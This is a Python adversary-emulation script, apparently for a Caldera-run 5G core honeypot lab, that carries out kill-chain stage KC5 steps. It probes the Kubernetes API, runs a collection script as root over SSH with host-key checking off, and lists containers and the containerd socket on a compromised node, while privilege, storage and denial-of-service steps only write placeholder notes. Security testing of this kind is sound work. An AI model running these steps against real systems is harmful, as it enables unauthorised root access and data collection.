#!/usr/bin/env python3
"""5G core compatible handlers for the FlagATT kill chain.

The original KC5 scripts exercise an OpenTelemetry-specific path where a
service-account token from the log namespace is intercepted and used to create
privileged node controllers.  The 5G core lab has a different workload shape, so
these handlers keep the same Caldera progression while collecting 5G-relevant
evidence through the PCF test service established in KC2.
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path


DATA_PATH = Path(os.getenv("DATA_PATH", "/tmp/KCData"))
OUT_DIR = DATA_PATH / "KC5" / "5gcore"
KC2_ATTACKADDR = DATA_PATH / "KC2" / "attackaddr"
SSH_KEY = Path.home() / ".ssh" / "id_ed25519"


def write_log(name: str, text: str) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    path = OUT_DIR / f"{name}.log"
    path.write_text(text.rstrip() + "\n", encoding="utf-8")
    print(path)


def run(command: list[str], *, input_text: str | None = None, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command,
        input=input_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )


def pcf_target() -> str | None:
    if KC2_ATTACKADDR.is_file():
        value = KC2_ATTACKADDR.read_text(encoding="utf-8", errors="ignore").strip()
        if value:
            return value
    return None


def ssh_command(target: str, remote: str) -> list[str]:
    return [
        "ssh",
        "-p",
        "4222",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=5",
        "-i",
        str(SSH_KEY),
        f"root@{target}",
        remote,
    ]


def ssh_available(target: str) -> bool:
    if not SSH_KEY.is_file():
        return False
    return run(ssh_command(target, "true"), timeout=10).returncode == 0


def action_mitm() -> int:
    control_plane = os.getenv("CONTROL_PLANE_NODE", "honeypotlab-control-plane")
    control_port = os.getenv("CONTROL_PLANE_PORT", "6443")
    resolved = run(["dig", "+short", control_plane, "A"], timeout=10)
    version = run(["curl", "-sk", "-m", "5", f"https://{control_plane}:{control_port}/version"], timeout=10)
    write_log(
        "mitm",
        "\n".join(
            [
                "5Gcore FlagATT MITM compatibility step",
                f"control_plane={control_plane}:{control_port}",
                f"resolved={resolved.stdout.strip()}",
                f"api_probe_rc={version.returncode}",
                version.stdout.strip()[:1000],
            ]
        ),
    )
    return 0


def action_priv_deploy() -> int:
    sentinel = DATA_PATH / "KC5" / "ssh" / "no-node-controllers"
    sentinel.parent.mkdir(parents=True, exist_ok=True)
    sentinel.write_text(
        "5Gcore compatibility mode: no OpenTelemetry updater-sa token is expected; "
        "node-controller deployment is not created.\n",
        encoding="utf-8",
    )
    write_log("priv-deploy", sentinel.read_text(encoding="utf-8"))
    return 0


def action_node_collection() -> int:
    target = pcf_target()
    if not target or not ssh_available(target):
        write_log("node-collection", "PCF SSH target is unavailable; collection skipped.")
        return 0

    helper = Path("/opt/caldera/KC4/container-collection.py")
    if not helper.is_file():
        write_log("node-collection", f"Missing helper: {helper}")
        return 0

    script = helper.read_text(encoding="utf-8")
    completed = run(ssh_command(target, "/usr/bin/env python3 -"), input_text=script, timeout=180)
    write_log(
        "node-collection",
        f"target={target}\nreturncode={completed.returncode}\n{completed.stdout[-12000:]}",
    )
    return 0


def action_node_imp() -> int:
    target = pcf_target()
    if not target or not ssh_available(target):
        write_log("node-imp", "PCF SSH target is unavailable; CRI evidence skipped.")
        return 0

    completed = run(
        ssh_command(
            target,
            "crictl ps -a 2>&1 | head -80; "
            "printf '\\n--- runtime socket ---\\n'; "
            "ls -l /host/run/containerd/containerd.sock 2>&1 || true",
        ),
        timeout=60,
    )
    write_log("node-imp", f"target={target}\nreturncode={completed.returncode}\n{completed.stdout}")
    return 0


def action_note(name: str) -> int:
    write_log(
        name,
        "\n".join(
            [
                f"5Gcore compatibility step: {name}",
                "The OpenTelemetry node-controller primitive is not present in this target.",
                f"timestamp={int(time.time())}",
            ]
        ),
    )
    return 0


def main(argv: list[str]) -> int:
    if not argv:
        print("Usage: flagatt-5gcore.py <mitm|priv-deploy|node-collection|node-imp|pvc-attack|state-update|pod-dos|cluster-dos>", file=sys.stderr)
        return 2

    action = argv[0]
    if action == "mitm":
        return action_mitm()
    if action == "priv-deploy":
        return action_priv_deploy()
    if action == "node-collection":
        return action_node_collection()
    if action == "node-imp":
        return action_node_imp()
    if action in {"pvc-attack", "state-update", "pod-dos", "cluster-dos"}:
        return action_note(action)

    print(f"Unknown action: {action}", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
